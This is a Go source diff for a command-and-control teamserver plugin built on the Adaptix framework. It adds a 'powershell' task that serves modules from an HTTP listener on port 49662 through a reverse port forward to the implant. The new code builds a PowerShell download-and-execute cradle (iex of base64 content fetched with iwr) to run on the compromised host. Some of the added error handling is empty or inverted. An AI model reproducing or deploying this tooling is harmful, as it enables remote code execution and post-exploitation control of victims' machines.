@@ -2,6 +2,7 @@ package main
 
 import (
 	"bytes"
+	"context"
 	"encoding/base64"
 	"encoding/binary"
 	"encoding/hex"
@@ -16,8 +17,9 @@ import (
 	"strconv"
 	"strings"
 	"time"
+	"net/http"
 
-	"github.com/Adaptix-Framework/axc2"
+	adaptix "github.com/Adaptix-Framework/axc2"
 )
 
 type GenerateConfig struct {
@@ -486,6 +488,40 @@ func CreateTaskCommandSaveMemory(ts Teamserver, agentId string, buffer []byte) i
 	return memoryId
 }
 
+/// CODE TO SERVE POWERSHELL IMPORTED MODULES
+
+const charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+var g_path = ""
+
+func RandStringBytes(n int) string {
+	b := make([]byte, n)
+	for i := range b {
+		b[i] = charset[rand.Intn(len(charset))]
+	}
+	return string(b)
+}
+
+func ServeFile(module string) {
+	var path = "/" + RandStringBytes(18)
+	g_path = path
+
+	ctx, cancel := context.WithCancel(context.Background())
+
+	http.HandleFunc(g_path, func(w http.ResponseWriter, r *http.Request) {
+		w.Write([]byte(module))
+	})
+
+	go func(ctx context.Context) {
+
+		if err := http.ListenAndServe(":49662", nil); err != nil {
+			cancel()
+		}
+		<-ctx.Done()
+	}(ctx)
+
+	cancel()
+}
+
 func CreateTask(ts Teamserver, agent adaptix.AgentData, args map[string]any) (adaptix.TaskData, adaptix.ConsoleMessageData, error) {
 	var (
 		taskData    adaptix.TaskData
@@ -635,7 +671,7 @@ func CreateTask(ts Teamserver, agent adaptix.AgentData, args map[string]any) (ad
 
 	case "link":
 		//if subcommand == "list" {
-		//	//array = []interface{}{COMMAND_PS_LIST}
+		//      //array = []interface{}{COMMAND_PS_LIST}
 		//} else
 		if subcommand == "smb" {
 			target, ok := args["target"].(string)
@@ -736,6 +772,64 @@ func CreateTask(ts Teamserver, agent adaptix.AgentData, args map[string]any) (ad
 
 		} else {
 			err = errors.New("subcommand must be 'start' or 'stop'")
+			goto RET
+		}
+
+	case "powershell":
+		if subcommand == "import" {
+			module, ok := args["module"].(string)
+			if !ok {
+				err = errors.New("parameter 'module' must be set")
+				goto RET
+			}
+
+			taskData.Type = TYPE_TUNNEL
+			tunnelId, err := ts.TsTunnelCreateRportfwd(agent.Id, "", 6969, "127.0.0.1", 6969)
+			if err != nil {
+				taskData.TaskId, err = ts.TsTunnelStart(tunnelId)
+				if err != nil {
+				}
+			} else {
+				ts.TsTunnelStopRportfwd(agent.Id, 6969)
+				tunnelId, err := ts.TsTunnelCreateRportfwd(agent.Id, "", 6969, "127.0.0.1", 6969)
+				if err != nil {
+				}
+				taskData.TaskId, err = ts.TsTunnelStart(tunnelId)
+				if err != nil {
+				}
+			}
+
+			ServeFile(module)
+			taskData.Message = "Importing module"
+			taskData.MessageType = MESSAGE_INFO
+			taskData.ClearText = "\n"
+
+		} else if subcommand == "module" {
+			output := true
+			programState := 0
+			programArgs, ok := args["args"].(string)
+			if ok {
+				programArgs = ConvertUTF8toCp("powershell.exe /c iex([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((iwr http://127.0.0.1:49662"+g_path+" -UseBasicParsing).Content)));"+programArgs, agent.ACP)
+			} else {
+				err = errors.New("parameter 'command' must be set")
+				goto RET
+			}
+
+			array = []interface{}{COMMAND_PS_RUN, output, programState, programArgs}
+		} else if subcommand != "" {
+			output := true
+			programState := 0
+			programArgs, ok := args["args"].(string)
+			if ok {
+				programArgs = ConvertUTF8toCp("powershell.exe /c "+programArgs, agent.ACP)
+			} else {
+				err = errors.New("parameter 'command' must be set")
+				goto RET
+			}
+
+			array = []interface{}{COMMAND_PS_RUN, output, programState, programArgs}
+		} else {
+			err = errors.New("Command not set or subcommand not found. It must be 'import' or 'module'")
 			goto RET
 		}
 
@@ -1110,8 +1204,6 @@ func ProcessTasksResult(ts Teamserver, agentData adaptix.AgentData, taskData ada
 		return outTasks
 	}
 
-	bof_output := make(map[string]bool)
-
 	for packer.Size() >= 8 {
 
 		if false == packer.CheckPacker([]string{"int", "int"}) {
@@ -1321,33 +1413,9 @@ func ProcessTasksResult(ts Teamserver, agentData adaptix.AgentData, taskData ada
 				}
 				output := packer.ParseString()
 
-				_, ok := bof_output[task.TaskId]
-				if ok {
-					task.Message = ""
-				} else {
-					bof_output[task.TaskId] = true
-					task.Message = "BOF output"
-				}
-
 				task.MessageType = MESSAGE_SUCCESS
+				task.Message = "BOF output"
 				task.ClearText = ConvertCpToUTF8(output, agentData.OemCP)
-
-			} else if outputType == CALLBACK_OUTPUT_UTF8 {
-				if false == packer.CheckPacker([]string{"array"}) {
-					return outTasks
-				}
-				output := packer.ParseString()
-
-				_, ok := bof_output[task.TaskId]
-				if ok {
-					task.Message = ""
-				} else {
-					bof_output[task.TaskId] = true
-					task.Message = "BOF output"
-				}
-
-				task.MessageType = MESSAGE_SUCCESS
-				task.ClearText = output
 
 			} else if outputType == CALLBACK_AX_SCREENSHOT {
 				if false == packer.CheckPacker([]string{"array", "array"}) {
@@ -1374,15 +1442,8 @@ func ProcessTasksResult(ts Teamserver, agentData adaptix.AgentData, taskData ada
 				}
 				output := packer.ParseString()
 
-				_, ok := bof_output[task.TaskId]
-				if ok {
-					task.Message = ""
-				} else {
-					bof_output[task.TaskId] = true
-					task.Message = "BOF output"
-				}
-
 				task.MessageType = MESSAGE_SUCCESS
+				task.Message = "BOF output"
 				task.ClearText = ConvertCpToUTF8(output, agentData.ACP)
 			}
 
